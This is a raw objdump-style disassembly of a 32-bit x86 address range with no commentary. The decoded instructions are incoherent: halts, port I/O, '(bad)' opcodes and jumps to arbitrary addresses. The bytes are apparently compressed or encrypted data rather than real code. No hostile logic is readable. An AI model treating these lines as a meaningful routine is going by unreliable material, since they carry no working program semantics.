  403127:	8b 57 3c             	mov    0x3c(%edi),%edx
  40312a:	87 f6                	xchg   %esi,%esi
  40312c:	ae                   	scas   %es:(%edi),%al
  40312d:	60                   	pusha
  40312e:	5a                   	pop    %edx
  40312f:	93                   	xchg   %eax,%ebx
  403130:	a1 80 78 2a c5       	mov    0xc52a7880,%eax
  403135:	f4                   	hlt
  403136:	d8 5a 42             	fcomps 0x42(%edx)
  403139:	63 e9                	arpl   %ebp,%ecx
  40313b:	29 bf 32 43 89 cc    	sub    %edi,-0x3376bcce(%edi)
  403141:	00 bf 6f d2 50 36    	add    %bh,0x3650d26f(%edi)
  403147:	76 0d                	jbe    0x403156
  403149:	9c                   	pushf
  40314a:	49                   	dec    %ecx
  40314b:	f5                   	cmc
  40314c:	45                   	inc    %ebp
  40314d:	d8 d7                	fcom   %st(7)
  40314f:	de 4d a0             	fimuls -0x60(%ebp)
  403152:	44                   	inc    %esp
  403153:	0e                   	push   %cs
  403154:	ac                   	lods   %ds:(%esi),%al
  403155:	51                   	push   %ecx
  403156:	1b f3                	sbb    %ebx,%esi
  403158:	a1 f6 ae b9 44       	mov    0x44b9aef6,%eax
  40315d:	91                   	xchg   %eax,%ecx
  40315e:	2a 3e                	sub    (%esi),%bh
  403160:	bb cf 1e 52 ed       	mov    $0xed521ecf,%ebx
  403165:	98                   	cwtl
  403166:	27                   	daa
  403167:	b2 b8                	mov    $0xb8,%dl
  403169:	3e c3                	ds ret
  40316b:	6e                   	outsb  %ds:(%esi),(%dx)
  40316c:	e7 c8                	out    %eax,$0xc8
  40316e:	c3                   	ret
  40316f:	2e 63 c9             	cs arpl %ecx,%ecx
  403172:	0b ca                	or     %edx,%ecx
  403174:	20 e3                	and    %ah,%bl
  403176:	6b 48 5a 8b          	imul   $0xffffff8b,0x5a(%eax),%ecx
  40317a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40317b:	7c f0                	jl     0x40316d
  40317d:	44                   	inc    %esp
  40317e:	fe c6                	inc    %dh
  403180:	ef                   	out    %eax,(%dx)
  403181:	47                   	inc    %edi
  403182:	65 ad                	lods   %gs:(%esi),%eax
  403184:	eb 72                	jmp    0x4031f8
  403186:	e0 b6                	loopne 0x40313e
  403188:	0e                   	push   %cs
  403189:	e4 04                	in     $0x4,%al
  40318b:	33 54 13 95          	xor    -0x6b(%ebx,%edx,1),%edx
  40318f:	62 67 c8             	bound  %esp,-0x38(%edi)
  403192:	ff 4f c7             	decl   -0x39(%edi)
  403195:	67 8e 21             	mov    (%bx,%di),%fs
  403198:	bc 08 7b f3 47       	mov    $0x47f37b08,%esp
  40319d:	e0 cd                	loopne 0x40316c
  40319f:	5a                   	pop    %edx
  4031a0:	d4 f7                	aam    $0xf7
  4031a2:	d3 9e 0e e1 78 33    	rcrl   %cl,0x3378e10e(%esi)
  4031a8:	56                   	push   %esi
  4031a9:	ee                   	out    %al,(%dx)
  4031aa:	24 8c                	and    $0x8c,%al
  4031ac:	c1 87 bb 2d 1d c9 a5 	roll   $0xa5,-0x36e2d245(%edi)
  4031b3:	f9                   	stc
  4031b4:	c6                   	(bad)
  4031b5:	f4                   	hlt
  4031b6:	59                   	pop    %ecx
  4031b7:	87 73 b3             	xchg   %esi,-0x4d(%ebx)
  4031ba:	5b                   	pop    %ebx
  4031bb:	b8 98 13 b8 04       	mov    $0x4b81398,%eax
  4031c0:	08 74 22 fc          	or     %dh,-0x4(%edx,%eiz,1)
  4031c4:	5c                   	pop    %esp
  4031c5:	0a 85 96 47 72 c1    	or     -0x3e8db86a(%ebp),%al
  4031cb:	70 6d                	jo     0x40323a
  4031cd:	3f                   	aas
  4031ce:	52                   	push   %edx
  4031cf:	b8 d8 61 a5 9d       	mov    $0x9da561d8,%eax
  4031d4:	82 ef 37             	sub    $0x37,%bh
  4031d7:	5e                   	pop    %esi
  4031d8:	d5 30                	aad    $0x30
  4031da:	32 33                	xor    (%ebx),%dh
  4031dc:	79 50                	jns    0x40322e
  4031de:	18 87 f5 7d ef d0    	sbb    %al,-0x2f10820b(%edi)
  4031e4:	36 01 14 2c          	add    %edx,%ss:(%esp,%ebp,1)
  4031e8:	d2 13                	rclb   %cl,(%ebx)
  4031ea:	8f                   	(bad)
  4031eb:	93                   	xchg   %eax,%ebx
  4031ec:	fa                   	cli
  4031ed:	19 d3                	sbb    %edx,%ebx
  4031ef:	22 6a 90             	and    -0x70(%edx),%ch
  4031f2:	58                   	pop    %eax
  4031f3:	15 21 e3 ea ed       	adc    $0xedeae321,%eax
  4031f8:	97                   	xchg   %eax,%edi
  4031f9:	db 16                	fistl  (%esi)
  4031fb:	fc                   	cld
  4031fc:	cf                   	iret
  4031fd:	3a 73 42             	cmp    0x42(%ebx),%dh
  403200:	25 9e c7 61 7d       	and    $0x7d61c79e,%eax
  403205:	5d                   	pop    %ebp
  403206:	5c                   	pop    %esp
  403207:	d4 60                	aam    $0x60
  403209:	90                   	nop
  40320a:	54                   	push   %esp
  40320b:	b3 86                	mov    $0x86,%bl
  40320d:	67 07                	addr16 pop %es
  40320f:	53                   	push   %ebx
  403210:	f0 89 60 c0          	lock mov %esp,-0x40(%eax)
  403214:	90                   	nop
  403215:	06                   	push   %es
  403216:	fb                   	sti
  403217:	bb 35 be 31 6d       	mov    $0x6d31be35,%ebx
  40321c:	c8 58 34 bf          	enter  $0x3458,$0xbf
  403220:	04 34                	add    $0x34,%al
  403222:	cb                   	lret
  403223:	36 be d4 30 96 95    	ss mov $0x959630d4,%esi
  403229:	3a 4a d1             	cmp    -0x2f(%edx),%cl
  40322c:	17                   	pop    %ss
  40322d:	40                   	inc    %eax
  40322e:	94                   	xchg   %eax,%esp
  40322f:	38 12                	cmp    %dl,(%edx)
  403231:	c6                   	(bad)
  403232:	12 53 3a             	adc    0x3a(%ebx),%dl
  403235:	0f a4 30 e8          	shld   $0xe8,%esi,(%eax)
  403239:	92                   	xchg   %eax,%edx
  40323a:	cc                   	int3
  40323b:	5b                   	pop    %ebx
  40323c:	88 1c 2f             	mov    %bl,(%edi,%ebp,1)
  40323f:	80 3e c2             	cmpb   $0xc2,(%esi)
  403242:	80 83 ce 14 08 02 1b 	addb   $0x1b,0x20814ce(%ebx)
  403249:	d8 71 f0             	fdivs  -0x10(%ecx)
  40324c:	9f                   	lahf
  40324d:	8f c6                	pop    %esi
  40324f:	92                   	xchg   %eax,%edx
  403250:	14 ea                	adc    $0xea,%al
  403252:	8a e1                	mov    %cl,%ah
  403254:	b1 4c                	mov    $0x4c,%cl
  403256:	d6                   	salc
  403257:	ea 4b f7 e4 8a 6b e2 	ljmp   $0xe26b,$0x8ae4f74b
  40325e:	eb 7e                	jmp    0x4032de
  403260:	47                   	inc    %edi
  403261:	7c e2                	jl     0x403245
  403263:	aa                   	stos   %al,%es:(%edi)
  403264:	6a 17                	push   $0x17
  403266:	8a eb                	mov    %bl,%ch
  403268:	03 9f fa f0 21 6e    	add    0x6e21f0fa(%edi),%ebx
  40326e:	ea 77 2b ee d6 9b 42 	ljmp   $0x429b,$0xd6ee2b77
  403275:	3f                   	aas
  403276:	7f d9                	jg     0x403251
  403278:	ed                   	in     (%dx),%eax
  403279:	e1 9a                	loope  0x403215
  40327b:	c3                   	ret
  40327c:	81 7b 25 17 bb 8b 03 	cmpl   $0x38bbb17,0x25(%ebx)
  403283:	53                   	push   %ebx
  403284:	1a c3                	sbb    %bl,%al
  403286:	3c 28                	cmp    $0x28,%al
  403288:	b9 01 2d 2e a3       	mov    $0xa32e2d01,%ecx
  40328d:	ba 90 d8 0d 5c       	mov    $0x5c0dd890,%edx
  403292:	b4 59                	mov    $0x59,%ah
  403294:	4c                   	dec    %esp
  403295:	2e b1 8c             	cs mov $0x8c,%cl
  403298:	6c                   	insb   (%dx),%es:(%edi)
  403299:	42                   	inc    %edx
  40329a:	13 a9 bc 72 5a 43    	adc    0x435a72bc(%ecx),%ebp
  4032a0:	9f                   	lahf
  4032a1:	ad                   	lods   %ds:(%esi),%eax
  4032a2:	8b 4b 82             	mov    -0x7e(%ebx),%ecx
  4032a5:	3f                   	aas
  4032a6:	45                   	inc    %ebp
  4032a7:	32 17                	xor    (%edi),%dl
  4032a9:	d6                   	salc
  4032aa:	bd 0e 8c bf 6f       	mov    $0x6fbf8c0e,%ebp
  4032af:	c1 1e 36             	rcrl   $0x36,(%esi)
  4032b2:	5c                   	pop    %esp
  4032b3:	66 f4                	data16 hlt
  4032b5:	6b 5b 2f 5b          	imul   $0x5b,0x2f(%ebx),%ebx
  4032b9:	f7 a9 fe 9c b4 ce    	imull  -0x314b6302(%ecx)
  4032bf:	5c                   	pop    %esp
  4032c0:	f4                   	hlt
  4032c1:	3c a4                	cmp    $0xa4,%al
  4032c3:	31 7d ce             	xor    %edi,-0x32(%ebp)
  4032c6:	dc 63 f2             	fsubl  -0xe(%ebx)
  4032c9:	65 11 59 ba          	adc    %ebx,%gs:-0x46(%ecx)
  4032cd:	c7                   	(bad)
  4032ce:	6d                   	insl   (%dx),%es:(%edi)
  4032cf:	2e 63 79 90          	arpl   %edi,%cs:-0x70(%ecx)
  4032d3:	68 63 4f 42 c2       	push   $0xc2424f63
  4032d8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4032d9:	2c 36                	sub    $0x36,%al
  4032db:	b9 a9 bf 3e 87       	mov    $0x873ebfa9,%ecx
  4032e0:	98                   	cwtl
  4032e1:	39 e1                	cmp    %esp,%ecx
  4032e3:	2d ef 42 26 48       	sub    $0x482642ef,%eax
  4032e8:	1d 03 87 b3 b7       	sbb    $0xb7b38703,%eax
  4032ed:	e0 d4                	loopne 0x4032c3
  4032ef:	ea 36 5e 17 bf 1c 93 	ljmp   $0x931c,$0xbf175e36
  4032f6:	3c 6d                	cmp    $0x6d,%al
  4032f8:	67 2f                	addr16 das
  4032fa:	6d                   	insl   (%dx),%es:(%edi)
  4032fb:	3c 9d                	cmp    $0x9d,%al
  4032fd:	df 89 9a 09 65 5f    	fisttps 0x5f65099a(%ecx)
  403303:	7e be                	jle    0x4032c3
  403305:	ee                   	out    %al,(%dx)
  403306:	97                   	xchg   %eax,%edi
  403307:	a1 01 a6 d5 96       	mov    0x96d5a601,%eax
  40330c:	d3 e5                	shl    %cl,%ebp
  40330e:	47                   	inc    %edi
  40330f:	76 7c                	jbe    0x40338d
  403311:	a1 41 9f 75 74       	mov    0x74759f41,%eax
  403316:	fd                   	std
  403317:	ff 9e 85 76 73 2b    	lcall  *0x2b737685(%esi)
  40331d:	c7                   	(bad)
  40331e:	10 b0 2c be fd 4e    	adc    %dh,0x4efdbe2c(%eax)
  403324:	1b 63 fe             	sbb    -0x2(%ebx),%esp
  403327:	90                   	nop
  403328:	68 6e 57 f1 d0       	push   $0xd0f1576e
  40332d:	08 d8                	or     %bl,%al
  40332f:	2a 4f 86             	sub    -0x7a(%edi),%cl
  403332:	4d                   	dec    %ebp
  403333:	fe                   	(bad)
  403334:	35 bb 3e ab 80       	xor    $0x80ab3ebb,%eax
  403339:	57                   	push   %edi
  40333a:	bd 7b b6 07 1e       	mov    $0x1e07b67b,%ebp
  40333f:	da 22                	fisubl (%edx)
  403341:	8d 8c 43 28 e9 83 df 	lea    -0x207c16d8(%ebx,%eax,2),%ecx
  403348:	1a ce                	sbb    %dh,%cl
  40334a:	95                   	xchg   %eax,%ebp
  40334b:	d4 ec                	aam    $0xec
  40334d:	0d bb b4 95 c9       	or     $0xc995b4bb,%eax
  403352:	0b dc                	or     %esp,%ebx
  403354:	8e 9c 63 3c b7 ad 99 	mov    -0x665248c4(%ebx,%eiz,2),%ds
  40335b:	b0 44                	mov    $0x44,%al
  40335d:	ef                   	out    %eax,(%dx)
  40335e:	9b                   	fwait
  40335f:	ec                   	in     (%dx),%al
  403360:	45                   	inc    %ebp
  403361:	e6 64                	out    %al,$0x64
  403363:	8c 34 8b             	mov    %?,(%ebx,%ecx,4)
  403366:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403367:	cc                   	int3
  403368:	81 96 2a 2e e9 30 c2 	adcl   $0xae6868c2,0x30e92e2a(%esi)
  40336f:	68 68 ae 
  403372:	66 3d 4e e3          	cmp    $0xe34e,%ax
  403376:	6b e8 99             	imul   $0xffffff99,%eax,%ebp
  403379:	7f 66                	jg     0x4033e1
  40337b:	b8 cf 2f ef 17       	mov    $0x17ef2fcf,%eax
  403380:	3b b5 7f 1b 43 11    	cmp    0x11431b7f(%ebp),%esi
  403386:	3f                   	aas
  403387:	35 28 f6 50 18       	xor    $0x1850f628,%eax
  40338c:	7b 37                	jnp    0x4033c5
  40338e:	76 f2                	jbe    0x403382
  403390:	aa                   	stos   %al,%es:(%edi)
  403391:	f3 dc 41 af          	repz faddl -0x51(%ecx)
  403395:	ab                   	stos   %eax,%es:(%edi)
  403396:	02 7a d0             	add    -0x30(%edx),%bh
  403399:	df 7c f3 5d          	fistpll 0x5d(%ebx,%esi,8)
  40339d:	17                   	pop    %ss
  40339e:	5d                   	pop    %ebp
  40339f:	8f                   	(bad)
  4033a0:	5f                   	pop    %edi
  4033a1:	0e                   	push   %cs
  4033a2:	20 d1                	and    %dl,%cl
  4033a4:	46                   	inc    %esi
  4033a5:	a2 57 2a ce d6       	mov    %al,0xd6ce2a57
  4033aa:	72 39                	jb     0x4033e5
  4033ac:	58                   	pop    %eax
  4033ad:	79 d7                	jns    0x403386
  4033af:	10 58 55             	adc    %bl,0x55(%eax)
  4033b2:	40                   	inc    %eax
  4033b3:	43                   	inc    %ebx
  4033b4:	02 f4                	add    %ah,%dh
  4033b6:	d8 d9                	fcomp  %st(1)
  4033b8:	bb b1 82 f7 e8       	mov    $0xe8f782b1,%ebx
  4033bd:	57                   	push   %edi
  4033be:	b1 5e                	mov    $0x5e,%cl
  4033c0:	45                   	inc    %ebp
  4033c1:	d5 1a                	aad    $0x1a
  4033c3:	70 8d                	jo     0x403352
  4033c5:	b8 fb 28 61 8e       	mov    $0x8e6128fb,%eax
  4033ca:	58                   	pop    %eax
  4033cb:	04 87                	add    $0x87,%al
  4033cd:	3e 09 7a 3c          	or     %edi,%ds:0x3c(%edx)
  4033d1:	e4 67                	in     $0x67,%al
  4033d3:	01 c9                	add    %ecx,%ecx
  4033d5:	d3 bd b3 eb 96 46    	sarl   %cl,0x4696ebb3(%ebp)
  4033db:	30 76 3f             	xor    %dh,0x3f(%esi)
  4033de:	1c cf                	sbb    $0xcf,%al
  4033e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4033e2:	4a                   	dec    %edx
  4033e3:	10 3d aa 6c 69 e7    	adc    %bh,0xe7696caa
  4033e9:	fe                   	(bad)
  4033ea:	29 75 69             	sub    %esi,0x69(%ebp)
  4033ed:	f9                   	stc
  4033ee:	03 51 61             	add    0x61(%ecx),%edx
  4033f1:	1f                   	pop    %ds
  4033f2:	9b                   	fwait
  4033f3:	fe                   	(bad)
  4033f4:	1a 1c 94             	sbb    (%esp,%edx,4),%bl
  4033f7:	13 d6                	adc    %esi,%edx
  4033f9:	c0 65 a4 1e          	shlb   $0x1e,-0x5c(%ebp)
  4033fd:	98                   	cwtl
  4033fe:	0e                   	push   %cs
  4033ff:	fc                   	cld
  403400:	52                   	push   %edx
  403401:	ec                   	in     (%dx),%al
  403402:	dd 8d 7f 57 d4 bd    	fisttpll -0x422ba881(%ebp)
  403408:	20 96 35 47 25 53    	and    %dl,0x53254735(%esi)
  40340e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40340f:	8f                   	(bad)
  403410:	5c                   	pop    %esp
  403411:	f3 dc c0             	repz fadd %st,%st(0)
  403414:	9c                   	pushf
  403415:	fa                   	cli
  403416:	78 f1                	js     0x403409
  403418:	00 bd 08 78 71 7b    	add    %bh,0x7b717808(%ebp)
  40341e:	d6                   	salc
  40341f:	0c 88                	or     $0x88,%al
  403421:	8d 2d 6f 56 d2 2d    	lea    0x2dd2566f,%ebp
  403427:	b6 08                	mov    $0x8,%dh
  403429:	07                   	pop    %es
  40342a:	d1 13                	rcll   $1,(%ebx)
  40342c:	be 09 e5 ae 59       	mov    $0x59aee509,%esi
  403431:	0c ef                	or     $0xef,%al
  403433:	d8 52 7c             	fcoms  0x7c(%edx)
  403436:	ac                   	lods   %ds:(%esi),%al
  403437:	af                   	scas   %es:(%edi),%eax
  403438:	10 17                	adc    %dl,(%edi)
  40343a:	26 fa                	es cli
  40343c:	19 c8                	sbb    %ecx,%eax
  40343e:	e9 5a 10 e1 34       	jmp    0x3521449d
  403443:	ee                   	out    %al,(%dx)
  403444:	b3 79                	mov    $0x79,%bl
  403446:	af                   	scas   %es:(%edi),%eax
  403447:	5c                   	pop    %esp
  403448:	27                   	daa
  403449:	86 54 a1 18          	xchg   %dl,0x18(%ecx,%eiz,4)
  40344d:	43                   	inc    %ebx
  40344e:	ab                   	stos   %eax,%es:(%edi)
  40344f:	33 8a e4 9f d4 95    	xor    -0x6a2b601c(%edx),%ecx
  403455:	e2 af                	loop   0x403406
  403457:	0d 86 dd 7c 4b       	or     $0x4b7cdd86,%eax
  40345c:	75 5c                	jne    0x4034ba
  40345e:	80 4c 04 b4 e8       	orb    $0xe8,-0x4c(%esp,%eax,1)
  403463:	ac                   	lods   %ds:(%esi),%al
  403464:	74 f1                	je     0x403457
  403466:	f9                   	stc
  403467:	fb                   	sti
  403468:	01 de                	add    %ebx,%esi
  40346a:	6d                   	insl   (%dx),%es:(%edi)
  40346b:	fc                   	cld
  40346c:	69 6b 80 fd e3 47 73 	imul   $0x7347e3fd,-0x80(%ebx),%ebp
  403473:	77 53                	ja     0x4034c8
  403475:	00 99 12 d6 41 e0    	add    %bl,-0x1fbe29ee(%ecx)
  40347b:	37                   	aaa
  40347c:	32 f4                	xor    %ah,%dh
  40347e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40347f:	86 71 18             	xchg   %dh,0x18(%ecx)
  403482:	f6 3d dd a5 70 c3    	idivb  0xc370a5dd
  403488:	68 8f 0f df 3b       	push   $0x3bdf0f8f
  40348d:	7a 6e                	jp     0x4034fd
  40348f:	51                   	push   %ecx
  403490:	9a 30 ac ec f4 2a 75 	lcall  $0x752a,$0xf4ecac30
  403497:	06                   	push   %es
  403498:	f3 7b 59             	repz jnp 0x4034f4
  40349b:	b1 f3                	mov    $0xf3,%cl
  40349d:	7a c4                	jp     0x403463
  40349f:	75 0a                	jne    0x4034ab
  4034a1:	51                   	push   %ecx
  4034a2:	a2 ea 8d 02 b8       	mov    %al,0xb8028dea
  4034a7:	28 12                	sub    %dl,(%edx)
  4034a9:	26 fb                	es sti
  4034ab:	8d                   	lea    (bad),%ebx
  4034ac:	dd 84 61 1b 0f b0 11 	fldl   0x11b00f1b(%ecx,%eiz,2)
  4034b3:	26 0d 10 37 ae 10    	es or  $0x10ae3710,%eax
  4034b9:	96                   	xchg   %eax,%esi
  4034ba:	9d                   	popf
  4034bb:	63 65 14             	arpl   %esp,0x14(%ebp)
  4034be:	42                   	inc    %edx
  4034bf:	c3                   	ret
  4034c0:	44                   	inc    %esp
  4034c1:	17                   	pop    %ss
  4034c2:	4a                   	dec    %edx
  4034c3:	5e                   	pop    %esi
  4034c4:	dd cb                	(bad)
  4034c6:	0b b1 31 c7 2f 39    	or     0x392fc731(%ecx),%esi
  4034cc:	72 9a                	jb     0x403468
  4034ce:	62 71 4c             	bound  %esi,0x4c(%ecx)
  4034d1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4034d2:	65 0a f2             	gs or  %dl,%dh
  4034d5:	ac                   	lods   %ds:(%esi),%al
  4034d6:	cf                   	iret
  4034d7:	7b 53                	jnp    0x40352c
  4034d9:	bc 76 ff 0c b2       	mov    $0xb20cff76,%esp
  4034de:	77 93                	ja     0x403473
  4034e0:	0e                   	push   %cs
  4034e1:	69 e3 14 fc 0a 49    	imul   $0x490afc14,%ebx,%esp
  4034e7:	2c 1a                	sub    $0x1a,%al
  4034e9:	91                   	xchg   %eax,%ecx
  4034ea:	d7                   	xlat   %ds:(%ebx)
  4034eb:	f3 db 52 e3          	repz fistl -0x1d(%edx)
  4034ef:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4034f0:	2a f8                	sub    %al,%bh
  4034f2:	4f                   	dec    %edi
  4034f3:	ff 2c 48             	ljmp   *(%eax,%ecx,2)
  4034f6:	a8 cb                	test   $0xcb,%al
  4034f8:	22 d6                	and    %dh,%dl
  4034fa:	78 d1                	js     0x4034cd
  4034fc:	1f                   	pop    %ds
  4034fd:	2c fd                	sub    $0xfd,%al
  4034ff:	02 42 21             	add    0x21(%edx),%al
  403502:	61                   	popa
  403503:	96                   	xchg   %eax,%esi
  403504:	e7 fb                	out    %eax,$0xfb
  403506:	e6 4f                	out    %al,$0x4f
  403508:	7a 50                	jp     0x40355a
  40350a:	84 2c ab             	test   %ch,(%ebx,%ebp,4)
  40350d:	54                   	push   %esp
  40350e:	18 bf f3 ae 18 4e    	sbb    %bh,0x4e18aef3(%edi)
  403514:	f5                   	cmc
  403515:	2a 75 a8             	sub    -0x58(%ebp),%dh
  403518:	64 c4                	fs (bad)
  40351a:	fc                   	cld
  40351b:	24 f8                	and    $0xf8,%al
  40351d:	2a 68 f1             	sub    -0xf(%eax),%ch
  403520:	a0 0a 94 fb 74       	mov    0x74fb940a,%al
  403525:	0b f7                	or     %edi,%esi
  403527:	97                   	xchg   %eax,%edi
  403528:	cc                   	int3
  403529:	46                   	inc    %esi
  40352a:	94                   	xchg   %eax,%esp
  40352b:	28 c7                	sub    %al,%bh
  40352d:	72 be                	jb     0x4034ed
  40352f:	89 6f 23             	mov    %ebp,0x23(%edi)
  403532:	46                   	inc    %esi
  403533:	18 6e 76             	sbb    %ch,0x76(%esi)
  403536:	43                   	inc    %ebx
  403537:	cc                   	int3
  403538:	ba 8c 6d 2a 1e       	mov    $0x1e2a6d8c,%edx
  40353d:	45                   	inc    %ebp
  40353e:	b0 60                	mov    $0x60,%al
  403540:	4c                   	dec    %esp
  403541:	98                   	cwtl
  403542:	d4 54                	aam    $0x54
  403544:	5a                   	pop    %edx
  403545:	45                   	inc    %ebp
  403546:	9a 5f 6e 87 c0 78 c5 	lcall  $0xc578,$0xc0876e5f
  40354d:	82 c6 fd             	add    $0xfd,%dh
  403550:	0c d7                	or     $0xd7,%al
  403552:	c8 ab ba 18          	enter  $0xbaab,$0x18
  403556:	76 13                	jbe    0x40356b
  403558:	45                   	inc    %ebp
  403559:	2c 4a                	sub    $0x4a,%al
  40355b:	9d                   	popf
  40355c:	ee                   	out    %al,(%dx)
  40355d:	2d 22 2f b9 36       	sub    $0x36b92f22,%eax
  403562:	4d                   	dec    %ebp
  403563:	a8 f3                	test   $0xf3,%al
  403565:	32 b2 d5 e1 6c 58    	xor    0x586ce1d5(%edx),%dh
  40356b:	3e 71 84             	jno,pt 0x4034f2
  40356e:	1b a7 f6 4a 01 56    	sbb    0x56014af6(%edi),%esp
  403574:	83 9c e6 51 42 ab 38 	sbbl   $0xa,0x38ab4251(%esi,%eiz,8)
  40357b:	0a 
  40357c:	57                   	push   %edi
  40357d:	13 6a 9e             	adc    -0x62(%edx),%ebp
  403580:	65 c4 8d 8b 2b fc 4a 	les    %gs:0x4afc2b8b(%ebp),%ecx
  403587:	85 e5                	test   %esp,%ebp
  403589:	cf                   	iret
  40358a:	68 b2 cf a2 a1       	push   $0xa1a2cfb2
  40358f:	25 a7 6b 0f b3       	and    $0xb30f6ba7,%eax
  403594:	f3 74 5c             	repz je 0x4035f3
  403597:	af                   	scas   %es:(%edi),%eax
  403598:	20 35 3d a5 fa a9    	and    %dh,0xa9faa53d
  40359e:	22 bc d3 5e 08 fd 24 	and    0x24fd085e(%ebx,%edx,8),%bh
  4035a5:	45                   	inc    %ebp
  4035a6:	6d                   	insl   (%dx),%es:(%edi)
  4035a7:	13 f0                	adc    %eax,%esi
  4035a9:	fb                   	sti
  4035aa:	0c 7c                	or     $0x7c,%al
  4035ac:	8a a6 c7 e1 27 53    	mov    0x5327e1c7(%esi),%ah
  4035b2:	bc 93 96 d7 a7       	mov    $0xa7d79693,%esp
  4035b7:	9e                   	sahf
  4035b8:	53                   	push   %ebx
  4035b9:	f3 57                	repz push %edi
  4035bb:	a2 20 59 7f fc       	mov    %al,0xfc7f5920
  4035c0:	89 01                	mov    %eax,(%ecx)
  4035c2:	18 f5                	sbb    %dh,%ch
  4035c4:	25 1c 55 3e 01       	and    $0x13e551c,%eax
  4035c9:	08 32                	or     %dh,(%edx)
  4035cb:	f8                   	clc
  4035cc:	c8 92 e2 85          	enter  $0xe292,$0x85
  4035d0:	72 c9                	jb     0x40359b
  4035d2:	ea 4c 62 7e 2e 8c 01 	ljmp   $0x18c,$0x2e7e624c
  4035d9:	1d 05 1d ec ac       	sbb    $0xacec1d05,%eax
  4035de:	dc f9                	fdivr  %st,%st(1)
  4035e0:	ec                   	in     (%dx),%al
  4035e1:	82 c1 20             	add    $0x20,%cl
  4035e4:	65 fc                	gs cld
  4035e6:	56                   	push   %esi
  4035e7:	50                   	push   %eax
  4035e8:	09 24 cc             	or     %esp,(%esp,%ecx,8)
  4035eb:	bb b8 96 13 01       	mov    $0x11396b8,%ebx
  4035f0:	22 1b                	and    (%ebx),%bl
  4035f2:	09 d0                	or     %edx,%eax
  4035f4:	af                   	scas   %es:(%edi),%eax
  4035f5:	ff 66 de             	jmp    *-0x22(%esi)
  4035f8:	70 43                	jo     0x40363d
  4035fa:	82 ff 29             	cmp    $0x29,%bh
  4035fd:	e3 5a                	jecxz  0x403659
  4035ff:	44                   	inc    %esp
  403600:	a3 29 d3 36 3c       	mov    %eax,0x3c36d329
  403605:	59                   	pop    %ecx
  403606:	48                   	dec    %eax
  403607:	ed                   	in     (%dx),%eax
  403608:	05 28 8f 55 f2       	add    $0xf2558f28,%eax
  40360d:	bf 8c cb ab 33       	mov    $0x33abcb8c,%edi
  403612:	75 87                	jne    0x40359b
  403614:	36 fc                	ss cld
  403616:	c9                   	leave
  403617:	d9 59 9f             	fstps  -0x61(%ecx)
  40361a:	64 3b 3d 29 6b c8 fa 	cmp    %fs:0xfac86b29,%edi
  403621:	b9 7b a0 6b 25       	mov    $0x256ba07b,%ecx
  403626:	12 8e 39 5d 80 d3    	adc    -0x2c7fa2c7(%esi),%cl
  40362c:	c2 8e ca             	ret    $0xca8e
  40362f:	3e 37                	ds aaa
  403631:	43                   	inc    %ebx
  403632:	c4 0d c9 27 22 0d    	les    0xd2227c9,%ecx
  403638:	8b 4b 3d             	mov    0x3d(%ebx),%ecx
  40363b:	39 42 0b             	cmp    %eax,0xb(%edx)
  40363e:	6b 81 bc 51 8a 5e 46 	imul   $0x46,0x5e8a51bc(%ecx),%eax
  403645:	b1 05                	mov    $0x5,%cl
  403647:	2b ad 51 4a 93 0d    	sub    0xd934a51(%ebp),%ebp
  40364d:	e8 47 18 c7 20       	call   0x21074e99
  403652:	37                   	aaa
  403653:	c5 4f 20             	lds    0x20(%edi),%ecx
  403656:	9a 1c 16 c5 64 7a 56 	lcall  $0x567a,$0x64c5161c
  40365d:	51                   	push   %ecx
  40365e:	22 5c 19 e1          	and    -0x1f(%ecx,%ebx,1),%bl
  403662:	4d                   	dec    %ebp
  403663:	d8 84 4d c9 cd 13 39 	fadds  0x3913cdc9(%ebp,%ecx,2)
  40366a:	3b 11                	cmp    (%ecx),%edx
  40366c:	db 96 67 33 14 e9    	fistl  -0x16ebcc99(%esi)
  403672:	5f                   	pop    %edi
  403673:	f3 ba 06 44 2b 81    	repz mov $0x812b4406,%edx
  403679:	78 e7                	js     0x403662
  40367b:	7c 05                	jl     0x403682
  40367d:	76 2c                	jbe    0x4036ab
  40367f:	bf d5 79 a6 9c       	mov    $0x9ca679d5,%edi
  403684:	5f                   	pop    %edi
  403685:	d9 bf 68 c6 79 53    	fnstcw 0x5379c668(%edi)
  40368b:	d1 26                	shll   $1,(%esi)
  40368d:	10 c0                	adc    %al,%al
  40368f:	a9 1f b7 ee 03       	test   $0x3eeb71f,%eax
  403694:	68 48 ef 5a 2f       	push   $0x2f5aef48
  403699:	ed                   	in     (%dx),%eax
  40369a:	29 b8 6f 79 cd 98    	sub    %edi,-0x67328691(%eax)
  4036a0:	32 09                	xor    (%ecx),%cl
  4036a2:	0c 16                	or     $0x16,%al
  4036a4:	9d                   	popf
  4036a5:	75 d3                	jne    0x40367a
  4036a7:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  4036aa:	ce                   	into
  4036ab:	1c f5                	sbb    $0xf5,%al
  4036ad:	be 22 72 2b 6c       	mov    $0x6c2b7222,%esi
  4036b2:	1c 31                	sbb    $0x31,%al
  4036b4:	d3 2a                	shrl   %cl,(%edx)
  4036b6:	fd                   	std
  4036b7:	6a e1                	push   $0xffffffe1
  4036b9:	a3 a2 ba 1a be       	mov    %eax,0xbe1abaa2
  4036be:	e7 f4                	out    %eax,$0xf4
  4036c0:	ee                   	out    %al,(%dx)
  4036c1:	a1 63 a1 7b 01       	mov    0x17ba163,%eax
  4036c6:	7b a2                	jnp    0x40366a
  4036c8:	86 ba 6a 57 42 3b    	xchg   %bh,0x3b42576a(%edx)
  4036ce:	7b e7                	jnp    0x4036b7
  4036d0:	3c d8                	cmp    $0xd8,%al
  4036d2:	89 65 66             	mov    %esp,0x66(%ebp)
  4036d5:	58                   	pop    %eax
  4036d6:	29 c2                	sub    %eax,%edx
  4036d8:	68 e9 88 ca 5c       	push   $0x5cca88e9
  4036dd:	c0 a3 44 48 14 bc 54 	shlb   $0x54,-0x43ebb7bc(%ebx)
  4036e4:	b6 9d                	mov    $0x9d,%dh
  4036e6:	8a 56 27             	mov    0x27(%esi),%dl
  4036e9:	f4                   	hlt
  4036ea:	8e 5a 0e             	mov    0xe(%edx),%ds
